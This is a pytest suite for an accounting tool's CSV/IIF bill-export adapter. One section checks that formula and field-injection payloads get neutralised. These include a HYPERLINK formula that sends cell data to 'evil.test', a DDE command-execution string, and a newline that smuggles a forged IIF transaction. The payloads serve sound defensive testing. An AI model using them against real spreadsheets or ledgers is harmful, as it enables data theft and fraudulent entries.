import os
import pathlib
from datetime import date
from pathlib import Path

import pytest

from ledger_sense.domain.money import money
from ledger_sense.writeback.export import ExportAdapter, export_adapter_from_environment
from ledger_sense.writeback.interface import (
    LineItem,
    WritebackPort,
    WriteRequest,
    build_idempotency_key,
)

GOLDENS = pathlib.Path("tests/writeback/goldens")


def _request(application_no: int = 2) -> WriteRequest:
    return WriteRequest(
        idempotency_key=build_idempotency_key("abc123", "C-1", application_no, tenant_id="t-test"),
        doc_id="doc-1", vendor_ref="Acme Steel Company", vendor_invoice_number=None,
        txn_date=date(2026, 8, 31),
        line_items=[
            LineItem(description="Sitework", amount=money("1000.00"), account_ref="54"),
            LineItem(description="Concrete", amount=money("2500.50"), account_ref="55"),
        ],
        memo="Application 2")


def test_the_export_adapter_satisfies_the_same_protocol(tmp_path: Path) -> None:
    assert isinstance(ExportAdapter(out_dir=str(tmp_path), fmt="csv"), WritebackPort)


def test_csv_output_matches_the_golden(tmp_path: Path) -> None:
    ExportAdapter(out_dir=str(tmp_path), fmt="csv").create_unapproved_bill(_request())
    assert (tmp_path / "bills.csv").read_text(encoding="utf-8") == \
        (GOLDENS / "bills.csv").read_text(encoding="utf-8")


def test_iif_output_matches_the_golden(tmp_path: Path) -> None:
    ExportAdapter(out_dir=str(tmp_path), fmt="iif").create_unapproved_bill(_request())
    assert (tmp_path / "bills.iif").read_text(encoding="utf-8") == \
        (GOLDENS / "bills.iif").read_text(encoding="utf-8")


def test_amounts_are_written_as_decimal_strings_never_floats(tmp_path: Path) -> None:
    ExportAdapter(out_dir=str(tmp_path), fmt="csv").create_unapproved_bill(_request())
    text = (tmp_path / "bills.csv").read_text(encoding="utf-8")
    assert "2500.50" in text
    assert "2500.5," not in text and "2500.5\n" not in text


def test_writing_the_same_key_twice_does_not_duplicate_a_row(tmp_path: Path) -> None:
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    adapter.create_unapproved_bill(_request())
    request = _request()
    result = adapter.create_unapproved_bill(request)
    rows = (tmp_path / "bills.csv").read_text(encoding="utf-8").strip().splitlines()
    assert len(rows) == 3          # header + two line items, written once
    assert result.was_replay is True


def test_export_never_reports_a_closed_period(tmp_path: Path) -> None:
    """There is no remote book to close. Say so rather than guessing."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    assert adapter.is_period_closed(date(2020, 1, 1)) is False


def test_reversal_removes_the_exported_rows(tmp_path: Path) -> None:
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    request = _request()
    result = adapter.create_unapproved_bill(request)
    adapter.reverse(result.remote_id, request.idempotency_key)
    rows = (tmp_path / "bills.csv").read_text(encoding="utf-8").strip().splitlines()
    assert len(rows) == 1          # header only


def test_iif_reversal_removes_the_whole_transaction_block(tmp_path: Path) -> None:
    """The IIF `reverse()` branch deletes a whole TRNS/SPL.../ENDTRNS block by
    key — this is a nontrivial rewrite (block deletion, not line deletion) with
    no direct coverage until now. Header rows must survive; every TRNS, SPL and
    ENDTRNS line belonging to the reversed bill must not."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="iif")
    request = _request()
    result = adapter.create_unapproved_bill(request)
    adapter.reverse(result.remote_id, request.idempotency_key)
    lines = (tmp_path / "bills.iif").read_text(encoding="utf-8").splitlines()
    assert lines[0].startswith("!TRNS")
    assert lines[1].startswith("!SPL")
    assert len(lines) == 2          # header only; the block is gone entirely
    assert not any(ln.startswith(("TRNS\t", "SPL\t")) or ln == "ENDTRNS"
                   for ln in lines)


def test_iif_reversal_leaves_a_different_bills_block_untouched(tmp_path: Path) -> None:
    """F-45 for the block-deletion rewrite: reversing one bill's key must not
    touch another bill's TRNS/SPL/ENDTRNS block, byte for byte."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="iif")
    keep = _request(application_no=3)
    adapter.create_unapproved_bill(keep)
    expected_keep_only = (tmp_path / "bills.iif").read_text(encoding="utf-8")

    doomed = _request()
    adapter.create_unapproved_bill(doomed)
    adapter.reverse(doomed.idempotency_key, doomed.idempotency_key)

    after = (tmp_path / "bills.iif").read_text(encoding="utf-8")
    assert after == expected_keep_only
    assert keep.idempotency_key in after
    assert doomed.idempotency_key not in after


def test_reversal_does_not_remove_a_row_that_merely_mentions_the_key(tmp_path: Path) -> None:
    """F-45. `remote_id not in ln` was a substring match over the whole line."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    keep = _request(application_no=3)
    keep.line_items[0].description = f"see {_request().idempotency_key}"
    adapter.create_unapproved_bill(keep)
    doomed = _request()
    adapter.create_unapproved_bill(doomed)
    adapter.reverse(doomed.idempotency_key, doomed.idempotency_key)
    text = (tmp_path / "bills.csv").read_text(encoding="utf-8")
    assert keep.idempotency_key in text


# ---- Formula injection: F-27 ----

@pytest.mark.parametrize("payload", [
    '=HYPERLINK("http://evil.test?x="&A1,"click")',
    '+1+1',
    '-2+3',
    '@SUM(1:9)',
    '=cmd|\' /C calc\'!A0',
])
def test_a_formula_in_an_extracted_description_is_neutralised(tmp_path: Path, payload: str) -> None:
    """The description comes out of a client-supplied PDF and lands in a .csv a
    bookkeeper opens in Excel. Anyone who can put an invoice in front of the
    client controls this string."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    request = _request()
    request.line_items[0].description = payload
    adapter.create_unapproved_bill(request)
    text = (tmp_path / "bills.csv").read_text(encoding="utf-8")
    assert payload not in text.replace("'" + payload, "")
    assert "'" + payload[0] in text or "'" + payload in text


def test_a_formula_in_an_extracted_vendor_name_is_neutralised(tmp_path: Path) -> None:
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    request = _request()
    request.vendor_ref = "=1+1"
    adapter.create_unapproved_bill(request)
    assert "'=1+1" in (tmp_path / "bills.csv").read_text(encoding="utf-8")


def test_a_tab_in_a_description_cannot_inject_an_extra_iif_transaction(tmp_path: Path) -> None:
    """IIF is tab-delimited and line-oriented. `"\\t".join(...)` with a tab or
    newline inside a field is a STRUCTURAL break — it can add a transaction row
    to a file destined for QuickBooks Desktop."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="iif")
    request = _request()
    request.line_items[0].description = "Sitework\nTRNS\tBILL\t2026-08-31\t54\tAttacker\t9999.00"
    adapter.create_unapproved_bill(request)
    lines = (tmp_path / "bills.iif").read_text(encoding="utf-8").splitlines()
    assert sum(1 for ln in lines if ln.startswith("TRNS\t")) == 1
    assert "Attacker" not in "\t".join(lines).split("\t")[:8]


def test_the_amount_column_is_never_reformatted_by_neutralisation(tmp_path: Path) -> None:
    """A leading apostrophe on a NUMBER would break the import. Only text fields
    are neutralised."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    adapter.create_unapproved_bill(_request())
    assert ",2500.50," in (tmp_path / "bills.csv").read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# Environment factory
# ---------------------------------------------------------------------------

def test_export_adapter_from_environment_builds_a_real_adapter(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("LEDGER_SENSE_WRITEBACK_DIR", str(tmp_path))
    adapter = export_adapter_from_environment()
    assert isinstance(adapter, ExportAdapter)
    assert adapter.name == "export"


def test_export_adapter_from_environment_raises_when_unset(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("LEDGER_SENSE_WRITEBACK_DIR", raising=False)
    with pytest.raises(RuntimeError, match="LEDGER_SENSE_WRITEBACK_DIR"):
        export_adapter_from_environment()


# --- LS-03: atomic, concurrency-safe export -------------------------------------


def _rows(path: Path) -> list[str]:
    return path.read_text(encoding="utf-8").strip().splitlines()


def test_concurrent_same_key_posts_write_the_bill_once(
        tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """LS-03. Two threads post the same key at once. Without a lock both pass
    the key check before either writes, giving four rows for a two-line bill.
    The key scan is slowed so the race is deterministic, not timing luck."""
    import threading
    import time

    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    real_scan = adapter._existing_keys

    def slow_scan() -> set[str]:
        keys = real_scan()
        time.sleep(0.15)
        return keys

    monkeypatch.setattr(adapter, "_existing_keys", slow_scan)
    results: list[bool] = []

    def post() -> None:
        results.append(adapter.create_unapproved_bill(_request()).was_replay)

    threads = [threading.Thread(target=post) for _ in range(2)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    assert sorted(results) == [False, True]
    assert len(_rows(tmp_path / "bills.csv")) == 3   # header + two lines, once


@pytest.mark.parametrize("fmt", ["csv", "iif"])
def test_a_partially_exported_bill_is_completed_on_retry(tmp_path: Path, fmt: str) -> None:
    """LS-03. A file left holding only the first line of a two-line bill (a
    crash under the old append-in-place writer) must not make the retry look
    like a completed replay with a row missing."""
    complete = tmp_path / "complete"
    ExportAdapter(out_dir=str(complete), fmt=fmt).create_unapproved_bill(_request())  # type: ignore[arg-type]
    whole = (complete / f"bills.{fmt}").read_text(encoding="utf-8").splitlines(keepends=True)
    # csv: header + first line only.  iif: 2 header lines + TRNS + first SPL, no ENDTRNS.
    cut = 2 if fmt == "csv" else 4
    (tmp_path / f"bills.{fmt}").write_text("".join(whole[:cut]), encoding="utf-8")

    result = ExportAdapter(out_dir=str(tmp_path), fmt=fmt).create_unapproved_bill(_request())  # type: ignore[arg-type]

    assert result.was_replay is False
    assert (tmp_path / f"bills.{fmt}").read_text(encoding="utf-8") == \
        (GOLDENS / f"bills.{fmt}").read_text(encoding="utf-8")


def test_an_interrupted_write_leaves_the_existing_file_intact_and_retry_succeeds(
        tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """LS-03. The file is replaced atomically: a failure at the moment of
    replacement leaves the previous contents untouched, never a half-bill."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    adapter.create_unapproved_bill(_request(application_no=1))
    before = (tmp_path / "bills.csv").read_text(encoding="utf-8")

    real_replace = os.replace
    calls = {"n": 0}

    def failing_replace(src: str | os.PathLike[str], dst: str | os.PathLike[str]) -> None:
        calls["n"] += 1
        if calls["n"] == 1:
            raise OSError("simulated crash during replacement")
        real_replace(src, dst)

    monkeypatch.setattr(os, "replace", failing_replace)
    with pytest.raises(OSError, match="simulated crash"):
        adapter.create_unapproved_bill(_request(application_no=2))
    assert (tmp_path / "bills.csv").read_text(encoding="utf-8") == before

    retry = adapter.create_unapproved_bill(_request(application_no=2))
    assert retry.was_replay is False
    assert len(_rows(tmp_path / "bills.csv")) == 5   # header + 2 bills x 2 lines
    assert not [p for p in tmp_path.iterdir() if p.name not in ("bills.csv",)]  # no stray temp file


def test_concurrent_create_and_reverse_do_not_lose_either_write(
        tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """LS-03. A reversal rewriting the file while another bill is being
    appended must not drop the new bill."""
    import threading
    import time

    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    first = _request(application_no=1)
    adapter.create_unapproved_bill(first)

    real_scan = adapter._existing_keys

    def slow_scan() -> set[str]:
        keys = real_scan()
        time.sleep(0.15)
        return keys

    monkeypatch.setattr(adapter, "_existing_keys", slow_scan)
    second = _request(application_no=2)
    writer = threading.Thread(target=lambda: adapter.create_unapproved_bill(second))
    writer.start()
    time.sleep(0.05)
    adapter.reverse(first.idempotency_key, first.idempotency_key)
    writer.join()

    rows = _rows(tmp_path / "bills.csv")
    assert len(rows) == 3                                  # header + the second bill's two lines
    assert all(r.startswith(second.idempotency_key) for r in rows[1:])
